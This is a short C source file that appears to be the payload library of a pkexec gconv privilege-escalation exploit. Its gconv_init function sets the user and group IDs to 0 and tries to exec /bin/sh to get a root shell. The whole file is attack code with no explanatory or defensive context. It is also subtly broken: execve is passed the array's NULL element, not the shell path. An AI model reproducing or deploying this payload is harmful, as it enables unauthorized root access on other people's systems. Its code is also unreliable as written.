#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
	char * const letstestwiththis[] = { "/bin/sh", NULL };
	char * const nowchangeTHIS[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
	//I add a comment here
	setuid(0);
	setgid(0);
	execve(letstestwiththis[1], letstestwiththis, nowchangeTHIS);
	exit(0);
	//Here we add more comments
}
